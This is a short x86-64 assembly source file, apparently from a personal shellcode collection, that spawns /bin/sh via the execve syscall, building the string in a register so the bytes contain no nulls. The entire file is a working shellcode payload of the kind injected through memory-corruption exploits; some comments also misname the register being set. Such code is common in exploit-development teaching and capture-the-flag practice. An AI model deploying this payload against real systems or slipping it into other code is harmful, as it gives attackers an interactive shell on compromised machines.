;;
;; shell.S for shellcodes
;; by lenormf
;;

bits 64

global _start

_start:
	;; execve("/bin/sh", 0, 0)
	xor rdx, rdx
	mov rsi, rdx

	mov rdi, 0x68732f6e69622fff	;; rax = "\xFF/bin/sh"
	shr rdi, 8			;; rax = "/bin/sh"
	push rdi
	mov rdi, rsp

	xor rax, rax
	mov al, 59			;; rax = 59 (execve)
	syscall
